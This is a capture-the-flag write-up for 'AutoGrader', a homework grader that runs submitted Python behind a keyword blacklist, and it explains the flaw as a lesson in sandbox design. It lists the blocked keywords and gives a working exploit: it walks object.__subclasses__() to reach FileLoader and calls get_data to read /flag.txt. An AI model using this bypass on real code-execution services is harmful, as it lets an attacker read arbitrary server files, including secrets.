# AutoGrader — Write-up

**Category:** Python Sandbox Escape  
**Flag:** offsec{REDACTED}

---

## Description

AutoGrader is a homework grading platform that executes user-submitted Python code server-side. It claims to run code in a secure sandbox that blocks dangerous operations via a keyword blacklist: `import`, `open()`, `read()`, `exec()`, `eval()`, `system()`, `getattr()`, `subprocess`, `__builtins__`, and others.

---

## Analysis

The sandbox performs **static analysis on the submitted source code**, rejecting submissions that contain blacklisted strings. However, it does not restrict access to Python's object graph at runtime.

Python loads many internal classes into memory at startup, before any user code runs. These classes are all reachable by walking the `__subclasses__()` tree starting from `object`:

```python
().__class__.__bases__[0].__subclasses__()  # every class currently loaded in the interpreter
```

Among them is `_frozen_importlib_external.FileLoader`, the class that Python uses internally to read module source files from disk. Its `get_data(path)` method reads arbitrary files without using any blacklisted keyword.

---

## Exploit

```python
def fibonacci(n):
    for cls in ().__class__.__bases__[0].__subclasses__():
        if 'FileLoader' in str(cls):
            return cls('', '').get_data('/flag.txt').decode()
```

Step by step:
- `().__class__.__bases__[0].__subclasses__()` — lists every class loaded in the interpreter, with no blacklisted keywords
- `'FileLoader' in str(cls)` — identifies `_frozen_importlib_external.FileLoader`
- `cls('', '')` — instantiates it with dummy arguments (two arguments needed, but they are ignored by `get_data`)
- `.get_data('/flag.txt')` — reads the file and returns its raw bytes
- `.decode()` — converts to string

The sandbox sees no forbidden keywords and accepts the submission. The grader prints the flag as the function's return value.

---

## Lesson Learned

Keyword blacklists are fundamentally insufficient to sandbox Python. The language's object model makes it possible to reach any loaded class (and their methods) without ever writing a blocked word. A real sandbox requires interpreter-level isolation: separate processes, seccomp filters, or dedicated sandboxing runtimes like PyPy's sandbox mode or nsjail.